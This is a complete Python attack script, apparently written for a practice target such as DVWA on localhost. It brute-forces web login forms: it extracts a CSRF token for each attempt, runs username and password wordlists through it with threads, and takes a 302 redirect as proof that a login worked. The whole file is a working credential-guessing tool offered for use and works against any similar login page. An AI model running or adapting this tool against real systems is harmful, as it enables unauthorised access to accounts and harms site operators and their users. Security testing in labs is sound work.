#!/usr/bin/env python3
# Usage:
# python3 redirect_brute_forcer.py -t "http://127.0.0.1:42001/login.php" -u usernames.txt -p passwords.txt -T 8
import requests
import re
import time
import argparse
from threading import Thread, Lock
from queue import Queue

class RedirectBruteForcer:
    def __init__(self, target_url, delay=0.1, threads=5):
        self.target_url = target_url
        self.delay = delay
        self.threads = threads
        self.found_credentials = []
        self.lock = Lock()
        self.attempt_count = 0
        
    def detect_success(self, response):
        """
        ULTIMATE SUCCESS DETECTION via HTTP redirects
        """
        # Method 1: Check status code (302 = redirect = success)
        if response.status_code == 302:
            return "SUCCESS_REDIRECT"
        
        # Method 2: Check Location header
        if 'Location' in response.headers:
            return "SUCCESS_LOCATION_HEADER"
            
        # Method 3: Check if still on login page
        if 'name="username"' in response.text and 'name="password"' in response.text:
            return "FAILURE_STILL_ON_LOGIN"
            
        # Uncertain case
        return "UNCERTAIN"

    def load_wordlist(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"❌ Error reading {filename}: {e}")
            return []

    def test_credentials(self, username, password):
        """Test single credential pair with redirect detection"""
        try:
            # Create new session for each attempt to ensure clean state
            session = requests.Session()
            
            # Get login page and extract token
            get_response = session.get(self.target_url)
            token_match = re.search(r'name="user_token" value="([^"]*)"', get_response.text)
            
            if not token_match:
                print(f"⚠️  Could not extract token for {username}:{password}")
                return False
                
            token = token_match.group(1)
            
            # Prepare POST data
            post_data = {
                'username': username,
                'password': password,
                'user_token': token,
                'Login': 'Login'
            }
            
            # 🎯 CRITICAL: Don't follow redirects automatically!
            post_response = session.post(
                self.target_url, 
                data=post_data,
                allow_redirects=False  # This is key!
            )
            
            self.attempt_count += 1
            
            # Detect success via redirect
            result = self.detect_success(post_response)
            
            if "SUCCESS" in result:
                with self.lock:
                    self.found_credentials.append((username, password))
                
                print(f"🎉 SUCCESS: [{username}][{password}]")
                print(f"   Detection: {result}")
                print(f"   Status: {post_response.status_code}")
                if 'Location' in post_response.headers:
                    print(f"   Redirect: {post_response.headers['Location']}")
                return True
            else:
                print(f"❌ Failed: {username}:{password} (Status: {post_response.status_code})")
                return False
                
        except Exception as e:
            print(f"💥 Error: {username}:{password} - {e}")
            return False

    def worker(self, queue):
        """Worker thread"""
        while True:
            try:
                username, password = queue.get(timeout=1)
                self.test_credentials(username, password)
                time.sleep(self.delay)
                queue.task_done()
            except:
                break

    def run_attack(self, usernames_file, passwords_file):
        """Main attack function"""
        print("🚀 REDIRECT-BASED BRUTE FORCER")
        print("=" * 60)
        print("SUCCESS DETECTION: HTTP Redirects")
        print("✅ SUCCESS = 302 status code OR Location header")
        print("❌ FAILURE = 200 status code, no redirect")
        print("=" * 60)
        
        usernames = self.load_wordlist(usernames_file)
        passwords = self.load_wordlist(passwords_file)
        
        if not usernames or not passwords:
            return
            
        print(f"📁 Usernames: {len(usernames)}")
        print(f"📁 Passwords: {len(passwords)}") 
        print(f"📊 Total: {len(usernames) * len(passwords)} combinations")
        print("=" * 60)
        print("Starting attack...\n")
        
        # Create queue
        queue = Queue()
        for username in usernames:
            for password in passwords:
                queue.put((username, password))
        
        # Start threads
        threads = []
        for i in range(self.threads):
            t = Thread(target=self.worker, args=(queue,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Wait for completion
        try:
            queue.join()
        except KeyboardInterrupt:
            print("\n⏹️  Interrupted by user")
        
        # Results
        self.print_results()

    def print_results(self):
        print("\n" + "=" * 60)
        print("🏁 ATTACK COMPLETED")
        print("=" * 60)
        print(f"Total attempts: {self.attempt_count}")
        print(f"Successful logins found: {len(self.found_credentials)}")
        
        if self.found_credentials:
            print("\n🎉 SUCCESSFUL CREDENTIALS:")
            print("-" * 40)
            for username, password in self.found_credentials:
                print(f"  ✅ [{username}][{password}]")
        else:
            print("\n❌ No successful logins found")
        print("=" * 60)

def main():
    parser = argparse.ArgumentParser(description='Redirect-Based Brute Forcer')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-u', '--usernames', required=True, help='Usernames file')
    parser.add_argument('-p', '--passwords', required=True, help='Passwords file') 
    parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between requests')
    parser.add_argument('-T', '--threads', type=int, default=5, help='Number of threads')
    
    args = parser.parse_args()
    
    brute_forcer = RedirectBruteForcer(
        target_url=args.target,
        delay=args.delay,
        threads=args.threads
    )
    
    brute_forcer.run_attack(args.usernames, args.passwords)

if __name__ == "__main__":
    main()
